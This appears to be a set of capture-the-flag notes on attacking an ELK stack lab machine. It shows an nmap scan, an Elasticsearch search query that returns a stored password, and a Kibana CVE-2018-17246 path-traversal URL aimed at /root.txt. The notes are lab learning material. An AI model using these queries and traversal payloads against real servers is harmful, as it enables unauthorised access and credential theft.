# Elf Stack

```
ELK stack (Elastic Search, Log Stash, and Kibana)
```

## Notes

```
export IP=10.10.254.253

nmap -sV -p- -vv -oN nmap-results 10.10.254.25

Nmap scan report for 10.10.254.253                                                                       │
Host is up (0.89s latency).                                                                              │
Not shown: 995 closed ports                                                                              │
PORT      STATE    SERVICE                                                                               │
111/tcp   open     rpcbind                                                                               │
617/tcp   filtered sco-dtmgr                                                                             │
8000/tcp  open     http-alt                                                                              │
9200/tcp  open     wap-wsp                                                                               │
13783/tcp filtered netbackup
```

## Questions

1. Find the password in database?

```
http://10.10.254.253:9200/_search/?q=password

l33tperson:9Qs58Ol3AXkMWLxiEyUyyf

```

2. Read the contents of the /root.txt file?

```
search kibana 6.4.2 vulns
CVE-2018-17246 seems interesting

http://10.10.254.253:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../root.txt (hangs)
http://10.10.254.253:8000 => view log file

Js error (ReferenceError: someELKFun is not defined)

someELKFun
```
